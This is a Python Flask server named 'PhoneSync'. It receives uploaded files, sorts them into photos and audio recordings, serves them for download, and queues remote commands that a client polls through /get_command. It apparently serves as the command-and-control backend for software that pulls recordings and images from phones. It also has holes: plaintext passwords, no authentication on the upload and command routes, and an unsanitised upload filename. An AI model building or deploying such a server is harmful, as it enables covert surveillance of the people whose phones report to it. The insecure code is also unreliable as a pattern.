from flask import Flask, request, jsonify
import sqlite3
import os
from flask import send_from_directory

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app = Flask(__name__)
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        command TEXT
    )
    """)

    conn.commit()
    conn.close()

init_db()
@app.route("/")
def home():
    return "PhoneSync Server Running Successfully!"

@app.route("/register", methods=["POST"])
def register():

    data = request.json

    username = data.get("username")
    email = data.get("email")
    password = data.get("password")

    try:
        conn = sqlite3.connect("database.db")
        cursor = conn.cursor()

        cursor.execute(
            "INSERT INTO users (username, email, password) VALUES (?, ?, ?)",
            (username, email, password)
        )

        conn.commit()
        conn.close()

        return jsonify({
            "status": "success",
            "message": "User Registered Successfully"
        })

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        })
@app.route("/login", methods=["POST"])
def login():

    data = request.json

    email = data.get("email")
    password = data.get("password")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "SELECT * FROM users WHERE email=? AND password=?",
        (email, password)
    )

    user = cursor.fetchone()
    conn.close()

    if user:
        return jsonify({
            "status": "success",
            "message": "Login Successful"
        })

    return jsonify({
        "status": "error",
        "message": "Invalid Email or Password"
    })
@app.route("/upload", methods=["POST"])
def upload_file():

    if "file" not in request.files:
        return jsonify({
            "status": "error",
            "message": "No file selected"
        })

    file = request.files["file"]

    if file.filename == "":
        return jsonify({
            "status": "error",
            "message": "Empty filename"
        })

    import os
    import time

    filename = file.filename
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(save_path)


    return jsonify({
    "status": "success",
    "message": "File uploaded successfully",
    "filename": filename
    })
@app.route('/files')
def list_files():

    photos = []
    audios = []

    for f in os.listdir(UPLOAD_FOLDER):

        path = os.path.join(UPLOAD_FOLDER, f)

        item = {
            "name": f,
            "modified": os.path.getmtime(path)
        }

        if f.endswith(".jpg"):
            photos.append(item)

        elif f.endswith(".m4a"):
            audios.append(item)

    photos.sort(
        key=lambda x: x["modified"],
        reverse=True
    )

    audios.sort(
        key=lambda x: x["modified"],
        reverse=True
    )

    return jsonify({
        "audio_recordings": audios,
        "photos": photos
    })
@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    return send_from_directory(
        UPLOAD_FOLDER,
        filename,
        as_attachment=True
    )
@app.route('/view/<filename>')
def view_file(filename):
    return send_from_directory(
        UPLOAD_FOLDER,
        filename
    )
@app.route("/send_command", methods=["POST"])
def send_command():

    data = request.json
    command = data.get("command")

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "INSERT INTO commands (command) VALUES (?)",
        (command,)
    )

    conn.commit()
    conn.close()

    return jsonify({
        "status": "success",
        "command": command
    })
@app.route("/get_command", methods=["GET"])
def get_command():

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute(
        "SELECT id, command FROM commands ORDER BY id DESC LIMIT 1"
    )

    result = cursor.fetchone()
    conn.close()

    if result:
        return jsonify({
            "status": "success",
            "id": result[0],
            "command": result[1]
        })

    return jsonify({
        "status": "empty",
        "command": ""
    })
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)